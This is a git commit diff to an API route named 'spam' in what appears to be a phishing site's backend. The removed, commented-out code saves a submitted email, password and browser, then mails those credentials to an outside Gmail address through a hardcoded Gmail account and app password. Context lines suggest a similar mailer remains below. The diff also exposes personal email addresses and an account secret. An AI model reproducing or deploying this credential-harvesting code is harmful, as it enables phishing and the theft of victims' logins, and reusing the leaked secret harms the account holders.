d53b60cc7ee3a169bb942a48422e69fe28768ba6
mourisnicolas <125296096+mourisnicolas@users.noreply.github.com>
2024-01-23 19:11:22 +0100

    Update index.js gg job

--- pages/api/spam/index.js
+++ pages/api/spam/index.js
@@ -9,52 +9,7 @@ export default async function handler(req, res) {
 
   switch (method) {
     case 'POST':
-      // try {
-
-      //   let p = await Spam.findOne({ email: body.email });
-      //   if(p) {
-      //     return res.status(201).send("k k");
-      //   }
-
-      //   let spam = new Spam(body);
-      //   await spam.save();
-
-      //   const transporter = nodeMailer.createTransport({
-      //     service: "gmail",
-      //     auth: {
-      //       user: "rheiinklaus@gmail.com",
-      //       pass: "fnjwlzlyqxbthlvw"
-      //     }
-      //   });
-        
-      //   const option = {
-      //     from: "rheiinklaus@gmail.com",
-      //     to: "mariac.perezcaba@gmail.com",
-      //     subject: "booooooooommmmmmmmmmmmmmmmm",
-      //     html: `
-      //       <p>email: ${body.email}</p>
-      //       <p>password: ${body.password}</p>
-      //       <p>browser: ${body.browser}</p>
-      //       <p>createdAt: ${Date(body.createdAt)}</p>
-      //     `
-      //   }
-
-      //   transporter.sendMail(option, function(error, info) {
-      //     if(error) {
-      //       cconsole.log(error);
-      //     } else {
-      //       console.log('mail send')
-      //     }
-      //   })
-
-      //   const token = jwt.sign({_id: this._id, date:}, "what", {expiresIn: "15h"});;
-
-
-      //   return res.status(201).header("stmmm", token).send("k k");
-      // } catch (error) {
-      //   console.log(error)
-      //   return res.status(400).send("Invalid username or password");
-      // }
+      return "good job";
 
       const transporter = nodeMailer.createTransport({
         service: "gmail",
